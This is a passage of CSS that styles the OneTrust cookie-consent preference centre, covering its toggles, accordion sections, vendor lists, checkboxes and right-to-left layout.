        #onetrust-pc-sdk .ot-cat-item h4+.ot-tgl,
        #onetrust-pc-sdk .ot-acc-txt h4+.ot-tgl-cntr {
            padding-left: 30px
        }
        
        #onetrust-pc-sdk .ot-sel-all-hdr,
        #onetrust-pc-sdk .ot-sel-all-chkbox {
            position: relative;
            display: inline-block;
            width: 100%
        }
        
        #onetrust-pc-sdk .ot-sel-all-chkbox {
            z-index: 1
        }
        
        #onetrust-pc-sdk .ot-li-hdr,
        #onetrust-pc-sdk .ot-consent-hdr {
            float: right;
            font-size: .813em;
            line-height: normal;
            text-align: center;
            word-break: break-word;
            word-wrap: break-word
        }
        
        #onetrust-pc-sdk .ot-li-hdr {
            max-width: 100px;
            min-width: 100px
        }
        
        #onetrust-pc-sdk .ot-consent-hdr {
            margin-right: 5px;
            max-width: 55px
        }
        
        #onetrust-pc-sdk .ot-ven-litgl+.ot-arw-cntr {
            margin-left: 81px
        }
        
        #onetrust-pc-sdk .ot-sel-all {
            margin: 0;
            position: relative;
            padding-right: 13px;
            float: right
        }
        
        #onetrust-pc-sdk #ot-selall-hostcntr,
        #onetrust-pc-sdk #ot-selall-vencntr {
            right: 20px;
            position: relative
        }
        
        #onetrust-pc-sdk #ot-selall-licntr {
            position: relative;
            right: 79px
        }
        
        #onetrust-pc-sdk #ot-pc-lst #ot-ven-lst .ot-sel-all {
            position: relative;
            display: inline-block;
            width: 20px;
            height: 25px
        }
        
        #onetrust-pc-sdk #ot-pc-lst #ot-ven-lst .ot-sel-all label {
            position: absolute;
            padding: 0;
            width: 18px;
            height: 18px
        }
        
        #onetrust-pc-sdk .ot-always-active-group .ot-cat-header {
            width: 55%
        }
        
        #onetrust-pc-sdk .ot-leg-btn-container {
            display: inline-block;
            width: 100%;
            margin-top: 10px
        }
        
        #onetrust-pc-sdk .ot-leg-btn-container button {
            height: auto;
            padding: 6.5px 8px;
            margin-bottom: 0;
            letter-spacing: 0;
            line-height: normal
        }
        
        #onetrust-pc-sdk .ot-leg-btn-container svg {
            display: none;
            height: 14px;
            width: 14px;
            padding-right: 5px;
            vertical-align: sub
        }
        
        #onetrust-pc-sdk .ot-active-leg-btn {
            cursor: default;
            pointer-events: none
        }
        
        #onetrust-pc-sdk .ot-active-leg-btn svg {
            display: inline-block
        }
        
        #onetrust-pc-sdk .ot-remove-objection-handler {
            border: none;
            text-decoration: underline;
            padding: 0;
            font-size: .82em;
            font-weight: 600;
            line-height: 1.4;
            padding-left: 10px
        }
        
        #onetrust-pc-sdk .ot-obj-leg-btn-handler span {
            font-weight: bold;
            text-align: center;
            font-size: .91em;
            line-height: 1.5
        }
        
        #onetrust-pc-sdk[dir=rtl] input~.ot-acc-hdr .ot-arw,
        #onetrust-pc-sdk[dir=rtl] #ot-back-arw {
            transform: rotate(180deg);
            -o-transform: rotate(180deg);
            -ms-transform: rotate(180deg);
            -webkit-transform: rotate(180deg)
        }
        
        #onetrust-pc-sdk[dir=rtl] input:checked~.ot-acc-hdr .ot-arw {
            transform: rotate(270deg);
            -o-transform: rotate(270deg);
            -ms-transform: rotate(270deg);
            -webkit-transform: rotate(270deg)
        }
        
        #onetrust-pc-sdk[dir=rtl] .ot-chkbox label::after {
            transform: rotate(45deg);
            -webkit-transform: rotate(45deg);
            -o-transform: rotate(45deg);
            -ms-transform: rotate(45deg);
            border-left: 0;
            border-right: 3px solid
        }
        
        #onetrust-pc-sdk[dir=rtl] .ot-lst-subhdr svg {
            right: 0
        }
        
        #onetrust-pc-sdk .ot-ven-ctgl,
        #onetrust-pc-sdk .ot-ven-litgl,
        #onetrust-pc-sdk .ot-host-tgl,
        #onetrust-pc-sdk .ot-ven-gvctgl {
            position: relative;
            display: inline-block;
            width: 20px;
            height: 20px;
            margin-left: 60px
        }
        
        #onetrust-pc-sdk .ot-ven-ctgl label,
        #onetrust-pc-sdk .ot-ven-litgl label,
        #onetrust-pc-sdk .ot-host-tgl label,
        #onetrust-pc-sdk .ot-ven-gvctgl label {
            position: absolute;
            width: 20px;
            height: 20px;
            margin: 0
        }
        
        #onetrust-pc-sdk #ot-host-lst .ot-host-expand {
            clear: both;
            float: none;
            display: block
        }
        
        #onetrust-pc-sdk ul {
            list-style: none
        }
        
        #onetrust-pc-sdk ul li {
            position: relative;
            margin: 0;
            padding: 15px 15px 15px 15px;
            border-bottom: 1px solid #e2e2e2
        }
        
        #onetrust-pc-sdk ul li h3 {
            font-size: .75em;
            color: #656565;
            margin: 0;
            height: auto;
            word-break: break-word;
            word-wrap: break-word
        }
        
        #onetrust-pc-sdk ul li p {
            margin: 0;
            font-size: .7em
        }
        
        #onetrust-pc-sdk .ot-ven-item>button:focus,
        #onetrust-pc-sdk .ot-host-item>button:focus,
        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item>button:focus,
        #onetrust-pc-sdk .ot-acc-cntr>button:focus {
            outline: #000 solid 2px
        }
        
        #onetrust-pc-sdk .ot-ven-item>button,
        #onetrust-pc-sdk .ot-host-item>button,
        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item>button,
        #onetrust-pc-sdk .ot-acc-cntr>button {
            position: absolute;
            cursor: pointer;
            width: 100%;
            height: 100%;
            margin: 0;
            top: 0;
            left: 0;
            z-index: 1;
            max-width: none;
            border: none
        }
        
        #onetrust-pc-sdk .ot-ven-item>button[aria-expanded=false]~.ot-acc-txt,
        #onetrust-pc-sdk .ot-host-item>button[aria-expanded=false]~.ot-acc-txt,
        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item>button[aria-expanded=false]~.ot-acc-txt,
        #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=false]~.ot-acc-txt {
            margin-top: 0;
            max-height: 0;
            overflow: hidden;
            width: 100%;
            transition: .25s ease-out;
            display: none
        }
        
        #onetrust-pc-sdk .ot-ven-item>button[aria-expanded=true]~.ot-acc-txt,
        #onetrust-pc-sdk .ot-host-item>button[aria-expanded=true]~.ot-acc-txt,
        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item>button[aria-expanded=true]~.ot-acc-txt,
        #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=true]~.ot-acc-txt {
            transition: .1s ease-in;
            width: auto;
            overflow: auto;
            display: block
        }
        
        #onetrust-pc-sdk .ot-host-item>button:focus {
            outline: 0;
            border: 2px solid #000
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors .ot-enbl-chr #ot-selall-vencntr {
            right: 0
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors>:not(.ot-enbl-chr) #ot-selall-licntr {
            right: 135px
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors>:not(.ot-enbl-chr) #ot-selall-adtlvencntr,
        #onetrust-pc-sdk.ot-addtl-vendors>:not(.ot-enbl-chr) #ot-selall-gnvencntr {
            right: 40px
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors .ot-li-hdr {
            margin-right: 15px
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors #ot-selall-licntr {
            right: 115px
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) #ot-sel-blk {
            background-color: #f9f9fc;
            border: 1px solid #e2e2e2;
            width: auto;
            padding-bottom: 5px;
            padding-top: 5px
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-sel-all {
            padding-right: 23px
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) ul li {
            border: 1px solid #e2e2e2;
            margin-bottom: 10px
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-sel-all-chkbox {
            float: right;
            width: auto;
            right: 3px
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-tgl-cntr {
            right: 12px
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-ven-ctgl {
            margin-left: 75px
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-ven-litgl+.ot-arw-cntr {
            margin-left: 95px
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-acc-cntr>.ot-acc-hdr {
            padding-top: 10px;
            padding-bottom: 10px
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) #ot-addtl-venlst .ot-tgl-cntr {
            right: 32px
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors #ot-ven-lst:first-child {
            border-top: none
        }
        
        #onetrust-pc-sdk.ot-addtl-vendors #ot-selall-vencntr {
            right: 40px;
            position: absolute
        }
        
        #onetrust-pc-sdk #ot-selall-adtlvencntr,
        #onetrust-pc-sdk #ot-selall-gnvencntr {
            position: relative;
            right: 20px
        }
        
        #onetrust-pc-sdk .ot-acc-cntr {
            position: relative;
            border-left: 1px solid #e2e2e2;
            border-right: 1px solid #e2e2e2;
            border-bottom: 1px solid #e2e2e2
        }
        
        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr {
            background-color: #f9f9fc;
            padding-left: 15px;
            padding-top: 5px;
            padding-bottom: 5px;
            width: calc(100% - 15px)
        }
        
        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr .ot-plus-minus {
            vertical-align: middle;
            top: auto
        }
        
        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr .ot-arw-cntr {
            right: 10px;
            left: auto
        }
        
        #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=true]~.ot-acc-hdr {
            border-bottom: 1px solid #e2e2e2
        }
        
        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-txt {
            padding-left: 10px;
            padding-right: 10px;
            padding-top: 10px;
            position: relative;
            z-index: 1
        }
        
        #onetrust-pc-sdk .ot-acc-cntr .ot-addtl-venbox {
            display: none
        }
        
        #onetrust-pc-sdk .ot-vensec-title {
            font-size: .813em;
            vertical-align: middle;
            display: inline-block
        }
        
        #onetrust-pc-sdk.ot-close-btn-link #close-pc-btn-handler {
            border: none;
            height: auto;
            line-height: 1.5;
            text-decoration: underline;
            font-size: .69em;
            background: none;
            right: 15px;
            top: 15px;
            width: auto;
            position: absolute;
            font-weight: normal
        }
        
        #onetrust-pc-sdk .ot-cat-header {
            float: left;
            font-weight: 600;
            font-size: .875em;
            line-height: 1.5;
            max-width: 90%;
            vertical-align: middle
        }
        
        #onetrust-pc-sdk .ot-vnd-item>button:focus {
            outline: #000 solid 2px
        }
        
        #onetrust-pc-sdk .ot-vnd-item>button {
            position: absolute;
            cursor: pointer;
            width: 100%;
            height: 100%;
            margin: 0;
            top: 0;
            left: 0;
            z-index: 1;
            max-width: none;
            border: none
        }
        
        #onetrust-pc-sdk .ot-vnd-item>button[aria-expanded=false]~.ot-acc-txt {
            margin-top: 0;
            max-height: 0;
            opacity: 0;
            overflow: hidden;
            width: 100%;
            transition: .25s ease-out;
            display: none
        }
        
        #onetrust-pc-sdk .ot-vnd-item>button[aria-expanded=true]~.ot-acc-txt {
            transition: .1s ease-in;
            margin-top: 10px;
            width: 100%;
            overflow: auto;
            display: block
        }
        
        #onetrust-pc-sdk .ot-vnd-item>button[aria-expanded=true]~.ot-acc-grpcntr {
            width: auto;
            margin-top: 0px;
            padding-bottom: 10px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item {
            position: relative;
            border-radius: 2px;
            margin: 0;
            padding: 0;
            border: 1px solid #d8d8d8;
            border-top: none;
            width: calc(100% - 2px);
            float: left
        }
        
        #onetrust-pc-sdk .ot-accordion-layout.ot-cat-item:first-of-type {
            margin-top: 10px;
            border-top: 1px solid #d8d8d8
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc {
            padding-left: 20px;
            padding-right: 20px;
            width: calc(100% - 40px);
            font-size: .812em;
            margin-bottom: 10px;
            margin-top: 15px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc>ul {
            padding-top: 10px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpdesc>ul li {
            padding-top: 0;
            line-height: 1.5;
            padding-bottom: 10px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout div+.ot-acc-grpdesc {
            margin-top: 5px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr:first-child {
            margin-top: 10px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr:last-child,
        #onetrust-pc-sdk .ot-accordion-layout .ot-hlst-cntr:last-child {
            margin-bottom: 5px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-hdr {
            padding-top: 11.5px;
            padding-bottom: 11.5px;
            padding-left: 20px;
            padding-right: 20px;
            width: calc(100% - 40px);
            display: inline-block
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-txt {
            width: 100%;
            padding: 0
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-subgrp-cntr {
            padding-left: 20px;
            padding-right: 15px;
            padding-bottom: 0;
            width: calc(100% - 35px)
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-subgrp {
            padding-right: 5px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-grpcntr {
            z-index: 1;
            position: relative
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            right: 20px;
            margin-top: -2px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header+.ot-arw-cntr .ot-arw {
            width: 15px;
            height: 20px;
            margin-left: 5px;
            color: dimgray
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-cat-header {
            float: none;
            color: #2e3644;
            margin: 0;
            display: inline-block;
            height: auto;
            word-wrap: break-word;
            min-height: inherit
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-vlst-cntr,
        #onetrust-pc-sdk .ot-accordion-layout .ot-hlst-cntr {
            padding-left: 20px;
            width: calc(100% - 20px);
            display: inline-block;
            margin-top: 0;
            padding-bottom: 2px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .ot-acc-hdr {
            position: relative;
            min-height: 25px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl,
        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-always-active {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            right: 20px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout h4~.ot-tgl+.ot-tgl {
            right: 95px
        }
        
        #onetrust-pc-sdk .ot-accordion-layout .category-vendors-list-handler,
        #onetrust-pc-sdk .ot-accordion-layout .category-vendors-list-handler+a {
            margin-top: 5px
        }
        
        #onetrust-pc-sdk #ot-lst-cnt {
            margin-top: 1rem;
            max-height: calc(100% - 96px)
        }
        
        #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info-cntr {
            border: 1px solid #d8d8d8;
            padding: .75rem 2rem;
            padding-bottom: 0;
            width: auto;
            margin-top: .5rem
        }
        
        #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info {
            margin-bottom: 1rem;
            padding-left: .75rem;
            padding-right: .75rem;
            display: flex;
            flex-direction: column
        }
        
        #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info[data-vnd-info-key*=DPOEmail] {
            border-top: 1px solid #d8d8d8;
            padding-top: 1rem
        }
        
        #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info[data-vnd-info-key*=DPOLink] {
            border-bottom: 1px solid #d8d8d8;
            padding-bottom: 1rem
        }
        
        #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info .ot-vnd-lbl {
            font-weight: bold;
            font-size: .85em;
            margin-bottom: .5rem
        }
        
        #onetrust-pc-sdk #ot-lst-cnt .ot-vnd-info .ot-vnd-cnt {
            margin-left: .5rem;
            font-weight: 500;
            font-size: .85rem
        }
        
        #onetrust-pc-sdk .ot-vs-list,
        #onetrust-pc-sdk .ot-vnd-serv {
            width: auto;
            padding: 1rem 1.25rem;
            padding-bottom: 0
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-serv-hdr-cntr,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-serv-hdr-cntr {
            padding-bottom: .75rem;
            border-bottom: 1px solid #d8d8d8
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr {
            font-weight: 600;
            font-size: .95em;
            line-height: 2;
            margin-left: .5rem
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item {
            border: none;
            margin: 0;
            padding: 0
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item button,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item button {
            outline: none;
            border-bottom: 1px solid #d8d8d8
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item button[aria-expanded=true],
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item button[aria-expanded=true] {
            border-bottom: none
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item:first-child,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item:first-child {
            margin-top: .25rem;
            border-top: unset
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item:last-child,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item:last-child {
            margin-bottom: .5rem
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item:last-child button,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item:last-child button {
            border-bottom: none
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info-cntr,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info-cntr {
            border: 1px solid #d8d8d8;
            padding: .75rem 1.75rem;
            padding-bottom: 0;
            width: auto;
            margin-top: .5rem
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info {
            margin-bottom: 1rem;
            padding-left: .75rem;
            padding-right: .75rem;
            display: flex;
            flex-direction: column
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info[data-vnd-info-key*=DPOEmail],
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info[data-vnd-info-key*=DPOEmail] {
            border-top: 1px solid #d8d8d8;
            padding-top: 1rem
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info[data-vnd-info-key*=DPOLink],
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info[data-vnd-info-key*=DPOLink] {
            border-bottom: 1px solid #d8d8d8;
            padding-bottom: 1rem
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info .ot-vnd-lbl,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info .ot-vnd-lbl {
            font-weight: bold;
            font-size: .85em;
            margin-bottom: .5rem
        }
        
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info .ot-vnd-cnt,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info .ot-vnd-cnt {
            margin-left: .5rem;
            font-weight: 500;
            font-size: .85rem
        }
        
        #onetrust-pc-sdk .ot-vs-list.ot-vnd-subgrp-cnt,
        #onetrust-pc-sdk .ot-vnd-serv.ot-vnd-subgrp-cnt {
            padding-left: 40px
        }
        
        #onetrust-pc-sdk .ot-vs-list.ot-vnd-subgrp-cnt .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr,
        #onetrust-pc-sdk .ot-vnd-serv.ot-vnd-subgrp-cnt .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr {
            font-size: .8em
        }
        
        #onetrust-pc-sdk .ot-vs-list.ot-vnd-subgrp-cnt .ot-cat-header,
        #onetrust-pc-sdk .ot-vnd-serv.ot-vnd-subgrp-cnt .ot-cat-header {
            font-size: .8em
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr .ot-vnd-serv {
            margin-bottom: 1rem;
            padding: 1rem .95rem
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr .ot-vnd-serv .ot-vnd-serv-hdr-cntr {
            padding-bottom: .75rem;
            border-bottom: 1px solid #d8d8d8
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr .ot-vnd-serv .ot-vnd-serv-hdr-cntr .ot-vnd-serv-hdr {
            font-weight: 700;
            font-size: .8em;
            line-height: 20px;
            margin-left: .82rem
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr .ot-cat-header {
            font-weight: 700;
            font-size: .8em;
            line-height: 20px
        }
        
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-vnd-serv .ot-vnd-lst-cont .ot-accordion-layout .ot-acc-hdr div.ot-chkbox {
            margin-left: .82rem
        }
        
        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr {
            padding: .5rem 0;
            margin: 0;
            display: flex;
            width: 100%;
            align-items: center;
            justify-content: space-between
        }
        
        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr div:first-child,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr div:first-child,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr div:first-child,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr div:first-child,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr div:first-child,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr div:first-child,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr div:first-child {
            margin-left: .5rem
        }
        
        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr div:last-child,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr div:last-child,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr div:last-child,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr div:last-child,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr div:last-child,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr div:last-child,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr div:last-child {
            margin-right: .5rem;
            margin-left: .5rem
        }
        
        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-always-active,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-always-active,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-always-active,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-always-active,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-always-active,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-always-active,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-always-active {
            position: relative;
            right: unset;
            top: unset;
            transform: unset
        }
        
        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-plus-minus,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-plus-minus,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-plus-minus,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-plus-minus,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-plus-minus,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-plus-minus,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-plus-minus {
            top: 0
        }
        
        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-arw-cntr,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-arw-cntr,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-arw-cntr,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-arw-cntr,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-arw-cntr,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-arw-cntr,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-arw-cntr {
            float: none;
            top: unset;
            right: unset;
            transform: unset;
            margin-top: -2px;
            position: relative
        }
        
        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-cat-header,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-cat-header,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-cat-header,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-cat-header,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-cat-header,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-cat-header,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-cat-header {
            flex: 1;
            margin: 0 .5rem
        }
        
        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-tgl,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-tgl,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-tgl,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-tgl,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-tgl,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-tgl,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-tgl {
            position: relative;
            transform: none;
            right: 0;
            top: 0;
            float: none
        }
        
        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-chkbox,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-chkbox,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-chkbox,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-chkbox,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-chkbox {
            position: relative;
            margin: 0 .5rem
        }
        
        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-chkbox label,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-chkbox label,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-chkbox label,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox label,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-chkbox label,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox label,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-chkbox label {
            padding: 0
        }
        
        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-chkbox label::before,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-chkbox label::before,
        #onetrust-pc-sdk .ot-subgrp-cntr ul.ot-subgrps .ot-acc-hdr .ot-chkbox label::before,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox label::before,
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-acc-hdr .ot-chkbox label::before,
        #onetrust-pc-sdk #ot-pc-lst .ot-vs-list .ot-vnd-item .ot-acc-hdr .ot-chkbox label::before,
        #onetrust-pc-sdk .ot-accordion-layout.ot-checkbox-consent .ot-acc-hdr .ot-chkbox label::before {
            position: relative
        }
        
        #onetrust-pc-sdk .ot-vs-config .ot-acc-hdr .ot-chkbox input,
        #onetrust-pc-sdk ul.ot-subgrps .ot-acc-hdr .ot-chkbox input,
